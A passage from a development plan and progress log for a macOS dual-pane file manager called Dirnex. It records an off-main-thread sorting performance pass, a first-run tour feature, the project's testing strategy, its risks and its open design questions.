byte path hits 1 ms); **subtracting two noisy ~380 ms build timings to isolate an ~8 ms keystroke is
numerically unstable** (it swung to 24 ms) — build the cache-cold model *outside* the timed region and
time only the `filter =` set instead.

**NEXT in M7:** **finish the perf pass** by moving the sort off the main thread — build the
`DirectoryModel` inside `DirectoryLoader.list`'s detached task (and the FSEvents refresh / column
re-sort paths) so opening a 100k dir never janks the `@MainActor` `PanelViewController`; needs a live
app build (Xcode + Metal toolchain) and live verification, so it is its own pass. Then the first-run
tour and the docs keyboard-reference (both buildable + live-verifiable, core-first). The remaining four
items are **blocked on the user**: Sparkle 2 + notarized-DMG CI needs their Developer ID signing
identity + notarization creds + Sparkle EdDSA keys; crash reporting + telemetry is a product/privacy
*decision* first; and private→public beta→1.0 is a release gate.

Progress (2026-07-18, **M7 perf pass — part 2: the off-main sort; the "Performance pass" box now
closes `[x]`, VERIFIED LIVE on a 100k directory**): part 1 met the filter budget and proved the exact
`localizedStandardCompare` sort is a ~350 ms floor at 100k that no in-thread trick beats without
diverging from Finder — so the 150 ms *list* target has to be met by sorting **off the main thread**.
This pass does that for every path that builds a pane's `DirectoryModel`. Core→app as always.
- **Core** (pure, tested): `DirectoryModel` gained an **off-main constructor** `init(listing:sort:
  showHidden:filter:directorySizes:)` (the existing 4-arg init now delegates to it with `[:]`) — it
  prunes the seeded `directorySizes` to present entries (as `updateListing` does) and sorts once, so a
  fully-materialised, `Sendable` model can be built on a background thread and handed over whole.
  `Panel` gained `setModel(_:)` — the off-main twin of `setListing`: it installs an already-sorted
  model and does **only** the cheap cursor/selection reconciliation (same refresh-vs-navigation
  decision by path, now factored into a shared `reconcile`), never a re-sort. **Second, a
  behaviour-preserving optimisation with its own payoff:** `setDirectorySize`/`setDirectorySizes` now
  re-sort **only when `sort.key == .size`** (`resortIfOrderDependsOnSize`) — under a name/date/ext sort
  the totals feed the size column and selection math but never the row order, so re-running the 350 ms
  sort was pure waste. That waste was real: size-visualization streams totals in ~ten a second, each of
  which used to re-sort the whole 100k listing on the main actor. The size-order tests (all `.size`
  sort) still pass; new tests pin that a name-sorted `setDirectorySize` updates the total without
  reordering, and that the sizes-init prunes + size-sorts. +6 core → **823 core**.
- **App**: `DirectoryLoader` gained `model(_:at:sort:showHidden:directorySizes:)` (readdir **and** sort
  in one detached task) and `sorted(_:sort:showHidden:directorySizes:)` (re-project an already-loaded
  listing off-main — the header re-sort). **THE decomposition decision: the loader sorts; the caller
  filters.** The text filter is *not* baked into the off-main model — it is the cheap ~1 ms stage and
  must reflect the caller's latest keystroke, so a new `installSortedModel` helper re-applies the live
  filter on the main actor after the `await`. It also re-applies **any directory total that completed
  while the sort ran** (a Space-on-dir / size-viz result lands on the live model; the wholesale swap
  would drop it) — restricted to present entries, and cheap because `setDirectorySizes` now no-ops the
  re-sort under a name sort. Six call sites converted: **navigation** (`navigate` → `DirectoryLoader.
  model`, empty filter+sizes → the filter-clear step is now implicit and was deleted); **FSEvents
  refresh** (`directoryDidChange`); **column-header re-sort** (`tableView(_:didClick:)`, now an async
  `Task` guarded on `loadToken`); **tab-activation refresh**; **post-mutation refresh**
  (`refreshCurrentDirectory`, local + SFTP). Each snapshots `sort`/`showHidden`/`directorySizes` on the
  main actor *before* the `await` and guards `token == loadToken` (+ path) after. Left synchronous on
  purpose: `refreshArchiveDirectory` (virtual, bounded, size-viz-disabled) and the app-wide
  **show-hidden toggle** (`applyGlobalShowHidden` re-sorts *every* tab in a loop — an off-main, lazy,
  all-tabs rebuild is a separate change; a single-tab hidden toggle at 100k still costs one 350 ms
  main-actor sort, the one residual jank). 823 core + 79 app tests green, swiftformat + swiftlint
  `--strict` clean, release `PerformanceBudget` unregressed (steady filter 1.7 ms, cold 11 ms, 100k
  build 432 ms). **VERIFIED LIVE on a seeded 100k `many/` fixture** (both panes seeded via the
  `Dirnex.tabs.<side>` defaults blob, app launched from Terminal for stderr): the 100k dir opened
  instantly in correct natural order; the **Name header toggled to descending off-main** with the
  cursor kept on `entry-000000` by identity; a **"999" filter** narrowed to 280 rows preserving the
  descending order; **navigating up cleared the filter, kept the sort, and landed the cursor on the
  departed child**; re-entering reloaded 100k instantly; the right pane's **Size sort** ordered
  empty<tiny<kilobyte<megabyte off-main; and an **FSEvents refresh** (a 512 KB file dropped on disk via
  the shell) inserted the new row **in size order** while **keeping a marked `tiny.bin` marked and the
  cursor on `kilobyte.bin`** (footer "1 of 5 selected · 1 byte") — the off-main refresh's identity
  preservation proven end-to-end. Clean stderr, no crash/race. **NEXT in M7:** the first-run tour and
  the docs keyboard-reference (both buildable + live-verifiable, core-first); the remaining four items
  stay blocked on the user (Sparkle/notarized-DMG CI creds, the crash-reporting/telemetry decision,
  beta→1.0). Optional perf follow-ups, neither blocking: move the show-hidden toggle's all-tabs re-sort
  off-main (lazy per-tab), and move the size-sorted-with-computed-totals streaming re-sort off-main
  (the one case `resortIfOrderDependsOnSize` still runs on the main actor).

Progress (2026-07-19, **M7 — First-run tour; the box closes `[x]`, VERIFIED LIVE**): the
palette-centric welcome the exit criterion needs a stranger to meet *before* the permission wall.
Core→app as always, and it slots in **ahead of** the shipped Full Disk Access onboarding rather than
beside it — the two now run as one sequence on a fresh install.
- **Core** (pure, tested): new `DirnexCore/Services/FirstRunTour.swift` — a `TourScreen` (id, SF
  symbol, title, body, and the highlighted **command ids**, not baked-in glyphs) and `FirstRunTour`
  with the ordered `screens` + a `maximumScreens = 5` ceiling. **THE data decision, the same
  `FunctionBar.defaultSlots` move: a screen names its actions by `CommandCatalog` id, so the app
  resolves each to the command's title and its *effective* shortcut through the user's `KeyBindings`
  — the tour prints exactly what the menu/⌘K palette print and can never advertise a key the app no
  longer honours.** Five screens: Welcome (dual-pane, no chip) · the command palette (`view.
  commandPalette`) · file ops (`file.copy/move/newFolder/trash`) · navigation (`go.editLocation`,
  `file.newTab`, `go.hotlist`) · You're-ready (`app.fullDiskAccess`). +7 tour tests pin length ≤ 5,
  well-formedness, unique ids, that **every highlighted id resolves to a real catalog command**, that
  the **palette is featured** (the load-bearing "palette-centric" claim), and that the tour opens on
  Welcome and closes on FDA. Plus a new `app.showTour` catalog command ("Welcome to Dirnex…",
  shortcut-free Application command, +1 catalog test). +8 → **831 core**.
- **App**: `Dirnex/Onboarding/FirstRunTourWindowController.swift` (a paged sheet over the browser
  window — SF-symbol illustration, headline, body, and a keyboard-reference list of the screen's
  commands as aligned **key-cap** rows resolved live from the registry; page dots + Back/Skip/Next,
  ⏎ = default advance, ⎋ = leave; **fixed-width right-aligned key-cap column so a shortcut-less row
  like Full Disk Access keeps its title aligned**) + `FirstRunTourPresenter.swift` (the
  `FullDiskAccessOnboarding` twin: a `hasSeenFirstRunTour` one-shot latch in `AppPreferences`, the
  `XCTestConfigurationFilePath` guard so it never fires mid-suite, and the **sequencing** — launch
  path shows the tour once then chains `FullDiskAccessOnboarding.presentIfNeeded`; on-demand path
  ("Welcome to Dirnex…" app-menu item + palette) always shows it and hands off to nothing). **THE
  sequencing decision: the last screen's primary button is parameterised, not hard-coded — the launch
  flow leaves "Get Started" (→ FDA hand-off), the on-demand flow sets "Open Command Palette" (→ opens
  ⌘K), so the palette-centric payoff never collides with the FDA sheet the first run needs.**
  `AppDelegate` now calls `FirstRunTourPresenter.presentIfNeeded` (was `FullDiskAccessOnboarding`
  directly); `showFirstRunTour(_:)` selector + `app.showTour` in `CommandBinding` + the menu item
  after Full Disk Access. +4 app tests (show-tour is wired; every highlighted command is
  real+dispatchable; the palette screen resolves to "⌘K"; the controller builds a window) → **83
  app**. 831 core + 83 app green, swiftformat + swiftlint `--strict` clean.
- **VERIFIED LIVE** (fresh Debug build, both latches reset, launched clean after killing the stale
  pre-rebuild instance — the recurring `open`-reactivates-the-old-binary trap): first launch popped
  the tour as a sheet on Welcome (no chip, no Back); paging showed the resolved **⌘K** cap on the
  palette screen, the **F5/F6/F7/F8** file-op rows aligned to the function bar below, the
  **⌘L/⌘T/⌃D** navigation rows, and the shortcut-less **Full Disk Access…** row with its title still
  column-aligned; **Get Started closed the tour and the FDA prompt appeared** (the hand-off);
  **Not Now** dismissed it; **App-menu ▸ Welcome to Dirnex…** reopened the tour, whose last screen now
  read **Open Command Palette** and, clicked, closed the tour and opened ⌘K with **no** FDA prompt;
  and a palette search for "welcome" found the command. **NEXT in M7:** the docs keyboard-reference
  (buildable now, core-first — the action registry already is the reference); the remaining four
  items stay blocked on the user (Sparkle/notarized-DMG CI creds, the crash-reporting/telemetry
  decision, beta→1.0).

## 5. Cross-cutting: testing strategy

| Layer | Approach |
|---|---|
| DirnexCore | Unit tests against generated fixtures; every operation tested for: success, cancel mid-flight, permission denied, disk full, source mutated during op |
| VFS backends | One shared conformance test suite run against every backend (Local, Archive, SFTP-against-docker) |
| Undo journal | Property tests: op + undo == original tree (compare via content hash) |
| Panels/keyboard | XCUITest smoke for the keyboard core; snapshot tests for panel rendering states |
| Performance | XCTest metrics gated in CI: 100k-dir list < 150 ms, filter keystroke < 16 ms, memory ceiling on huge dirs |

## 6. Risks

| Risk | Mitigation |
|---|---|
| SwiftUI temptation for panels degrades perf later | Decision locked in §2; perf budgets in CI make regressions loud |
| Undo journal correctness (the scariest feature) | Property tests from M2 day one; non-reversible ops explicitly marked in UI, never silently dropped |
| FSEvents refresh fighting the cursor/selection | DirectoryModel diffs snapshots and reapplies cursor by identity, not row index; test with high-churn fixture |
| Archive writes corrupting user data | Always rewrite to temp + atomic swap; never in-place |
| Full Disk Access friction kills onboarding | Dedicated flow in M7; app degrades gracefully (browse home dir) before grant |
| Scope creep before the feel is right | M1 exit criteria are the gate; nothing from M3+ starts until M1 feels great |

## 7. Open questions (decide by end of M1)

- Space key: TC uses it for select+dir-size, macOS muscle memory says Quick Look.
  Current plan: Space = select/size (TC), Cmd+Y and a palette action = Quick Look.
  Validate with real use in M1.
- Quick view panel shortcut (Ctrl+Q vs Cmd+Shift+Q) — Cmd+Q is untouchable.
- Tabs UI: native-style segmented tabs vs compact TC-style. Prototype both in M1.
- Name/brand check for "Dirnex" before public beta (M7).
